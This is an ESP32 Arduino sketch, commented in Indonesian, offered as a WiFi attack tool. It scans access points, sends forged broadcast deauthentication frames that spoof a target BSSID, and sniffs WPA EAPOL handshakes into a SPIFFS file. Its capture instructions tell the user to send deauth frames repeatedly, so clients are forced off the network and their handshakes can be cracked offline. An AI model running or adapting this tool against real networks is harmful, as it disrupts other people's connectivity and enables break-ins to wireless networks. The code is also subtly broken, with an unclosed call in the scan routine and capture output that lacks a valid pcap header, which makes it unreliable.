/*
 * ESP32 WiFi Tools - Scan, Deauth, Capture Handshake
 * By XZzDigital - Untuk DevKit V1
 * 
 * Fitur:
 * - Scan AP sekitar
 * - Deauth target
 * - Capture handshake (EAPOL)
 * - Simpan ke SPIFFS
 * 
 * Cara pakai: buka Serial Monitor 115200
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <SPIFFS.h>

// ─── KONFIGURASI ──────────────────────────────────────────
uint8_t target_bssid[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; // Ganti dengan BSSID target
uint8_t target_channel = 1;
bool handshake_captured = false;
File pcap_file;

// ─── SCAN AP ──────────────────────────────────────────────
void scanAPs() {
    Serial.println("\n[*] Scanning WiFi...");
    WiFi.mode(WIFI_STA
    WiFi.disconnect();
    delay(100);
    
    int n = WiFi.scanNetworks();
    Serial.printf("[+] Ditemukan %d jaringan:\n", n);
    
    for (int i = 0; i < n; i++) {
        Serial.printf("%d: %s (%d dBm) Ch:%d BSSID:%s\n",
                      i + 1,
                      WiFi.SSID(i).c_str(),
                      WiFi.RSSI(i),
                      WiFi.channel(i),
                      WiFi.BSSIDstr(i).c_str());
    }
    Serial.println();
}

// ─── DEAUTH FRAME ─────────────────────────────────────────
void sendDeauth() {
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,                         // Frame Control
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (diisi)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (diisi)
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason code
    };
    memcpy(deauth_frame + 10, target_bssid, 6);
    memcpy(deauth_frame + 16, target_bssid, 6);
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    Serial.println("[*] Deauth sent!");
}

// ─── SNIFFER (capture handshake) ──────────────────────────
void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    // Filter dari target BSSID
    if (memcmp(frame + 10, target_bssid, 6) != 0 &&
        memcmp(frame + 4, target_bssid, 6) != 0) {
        return;
    }
    
    // Cek EAPOL (handshake)
    if (len > 32) {
        uint16_t ethertype = (frame[30] << 8) | frame[31];
        if (ethertype == 0x888E) {
            if (!handshake_captured) {
                Serial.println("[!] HANDSHAKE CAPTURED!");
                pcap_file.write(pkt->payload, len);
                pcap_file.flush();
                handshake_captured = true;
                digitalWrite(LED_BUILTIN, HIGH);
            }
        }
    }
}

// ─── SETUP ────────────────────────────────────────────────
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, LOW);
    
    Serial.println("\n=== ESP32 WiFi Tools ===");
    Serial.println("Commands:");
    Serial.println("  scan      - Scan AP");
    Serial.println("  deauth    - Kirim deauth");
    Serial.println("  capture   - Mulai capture handshake");
    Serial.println("  stop      - Stop capture");
    
    // Init SPIFFS
    if (!SPIFFS.begin(true)) {
        Serial.println("SPIFFS mount failed");
        return;
    }
}

// ─── LOOP ─────────────────────────────────────────────────
void loop() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd == "scan") {
            scanAPs();
        }
        else if (cmd == "deauth") {
            sendDeauth();
        }
        else if (cmd == "capture") {
            pcap_file = SPIFFS.open("/handshake.pcap", FILE_WRITE);
            if (!pcap_file) {
                Serial.println("[!] Gagal buka file");
                return;
            }
            
            WiFi.mode(WIFI_MODE_STA);
            WiFi.disconnect();
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(sniffer);
            
            Serial.println("[*] Capture dimulai. Kirim 'deauth' berulang.");
        }
        else if (cmd == "stop") {
            esp_wifi_set_promiscuous(false);
            if (pcap_file) pcap_file.close();
            Serial.println("[*] Capture dihentikan.");
        }
        else if (cmd == "help") {
            Serial.println("Commands: scan, deauth, capture, stop");
        }
        else {
            Serial.println("[!] Command tidak dikenali");
        }
    }
}
